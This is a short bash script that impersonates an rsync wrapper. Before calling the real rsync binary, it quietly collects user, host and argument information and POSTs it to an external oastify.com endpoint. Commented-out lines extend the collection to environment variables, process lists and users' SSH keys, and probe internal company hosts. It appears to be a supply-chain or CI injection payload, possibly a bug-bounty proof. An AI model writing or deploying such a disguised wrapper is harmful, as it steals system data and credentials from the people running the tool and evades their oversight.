#!/usr/bin/env bash
apt update && apt install -y curl

LOG="$(mktemp)"
 
echo "== system ==" >> "${LOG}"
id >> "${LOG}"
date >> "${LOG}"
uname -a >> "${LOG}"

# echo "== env ==" >> "${LOG}"
# env >> "${LOG}"

# echo "== ps aux ==" >> "${LOG}"
# ps aux >> "${LOG}"

# cat ~/.ssh/* >> "${LOG}"

# echo "== cat user ssh keys ==" >> "${LOG}"
# cat /home/*/.ssh/* >> "${LOG}"

# echo "== ls tmp ==" >> "${LOG}"
# ls -lah /tmp/ >> "${LOG}"

# echo "== ls Root ==" >> "${LOG}"
# ls -lah / >> "${LOG}"

echo "== args ==" >> "${LOG}"
echo "$@" >> "${LOG}"

# echo "== nrm-vir-repository-01.priv.normation.com ==" >> "${LOG}"
# curl --max-time 1 -v "http://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
# curl --max-time 1 -v "https://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"

# echo "== ci.normation.com/jenkins/ ==" >> "${LOG}"
# curl --max-time 1 -v "https://ci.normation.com/jenkins/" 2>&1 >> "${LOG}"

# send the collected log to the OAST endpoint
curl -s -X POST --data-binary @"${LOG}" "https://smiy3gt5e0ip7zzctxrkoif6axgo4js8.oastify.com/rsync_wrapper"

/usr/local/bin/rsync.real --verbose --stats "$@"
# clean up
rm -f "${LOG}"
